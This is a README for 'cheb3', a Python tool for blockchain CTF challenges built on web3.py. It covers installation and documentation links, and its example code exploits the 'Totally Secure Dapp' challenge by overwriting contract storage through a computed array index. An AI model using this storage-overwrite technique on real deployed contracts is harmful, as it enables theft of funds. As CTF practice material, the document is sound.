.. raw:: html

    <p align="center">
        <img width="300" src="https://raw.githubusercontent.com/YanhuiJessica/cheb3/main/docs/_static/img/cheb3.png">
    </p>

    <p align="center">🐣 web3 CTF tool based on web3.py</p>

    <p align="center">
        <a href="https://cheb3.readthedocs.io/en/latest/index.html">
            <a href="https://pypi.python.org/pypi/cheb3"><img alt="PyPI" src="https://img.shields.io/pypi/v/cheb3.svg"></a>
            <img alt="Documentation" src="https://img.shields.io/readthedocs/cheb3.svg">
        </a>
    </p>

Installation
============

`cheb3` can be installed using `pip` as follows:

.. code-block:: shell

    $ python3 -m pip install cheb3

With `virtualenv` (Recommended)
-------------------------------

You can setup a clean environment for `cheb3`:

.. code-block:: shell

    $ python3 -m pip install virtualenv
    $ virtualenv -p python3 ~/.cheb3_env    # Create a virtual environment
    $ source ~/.cheb3_env/bin/activate  # Activate the new virtual environment
    $ pip install -U cheb3  # Install cheb3 in the virtual environment

Then, activate this environment every time before using `cheb3`:

.. code-block:: shell

    $ source ~/.cheb3_env/bin/activate 
    (.cheb3_env) $

.. end-of-readme-intro

Examples
========

Without `cheb3`, you might write code like this:

.. code-block:: python

    # https://yanhuijessica.github.io/Chictf-Writeups/blockchain/static/totally-secure-dapp.zip

    from web3 import Web3
    import json

    def transact(func, gas=1000000, gas_price=None):
        tx = account.sign_transaction(eval(func).build_transaction({
            'chainId': w3.eth.chain_id,
            'nonce': w3.eth.get_transaction_count(account.address),
            'gas': gas,
            'gasPrice': gas_price if gas_price else w3.eth.gas_price,
        })).raw_transaction
        tx_hash = w3.eth.send_raw_transaction(tx).hex()
        return w3.eth.wait_for_transaction_receipt(tx_hash)

    w3 = Web3(Web3.HTTPProvider("<rpc-url>"))
    account = w3.eth.account.from_key("<private-key>")

    challenge_addr = "<contract-address>"

    abi = json.loads(open("abi.json").read())
    challenge = w3.eth.contract(address=challenge_addr, abi=abi)

    transact("challenge.functions.removePost(1)")

    index = 2**256 - int(Web3.solidity_keccak(['uint256'], [3]).hex(), 16) + 2
    transact(f"challenge.functions.editPost({index}, 'unimportant', 'unimportant')")

    transact("challenge.functions.captureFlag()")

With `cheb3`, you can write code like this:

.. code-block:: python

    from web3 import Web3
    from cheb3 import Connection
    from cheb3.utils import load_compiled

    conn = Connection("<rpc-url>")
    account = conn.account("<private-key>")

    challenge_addr = "<contract-address>"

    abi, _ = load_compiled("TotallySecureDapp.sol")
    challenge = conn.contract(account, challenge_addr, abi=abi)

    challenge.functions.removePost(1).send_transaction()

    index = 2**256 - int(Web3.solidity_keccak(['uint256'], [3]).hex(), 16) + 2
    challenge.functions.editPost(index, "unimportant", "unimportant").send_transaction()

    challenge.functions.captureFlag().send_transaction()

Other examples of using `cheb3` in CTF challenges can be found in `/examples <examples/>`_.

Documentation
=============

- Quick Start
    - `Making Connections <https://cheb3.readthedocs.io/en/latest/connection_basis.html>`_
    - `Interaction Basis <https://cheb3.readthedocs.io/en/latest/interaction_basis.html>`_
- API Reference
    - `Connection <https://cheb3.readthedocs.io/en/latest/connection.html>`_
    - `Account <https://cheb3.readthedocs.io/en/latest/account.html>`_
    - `Contract <https://cheb3.readthedocs.io/en/latest/contract.html>`_
    - `cheb3.utils <https://cheb3.readthedocs.io/en/latest/utils.html>`_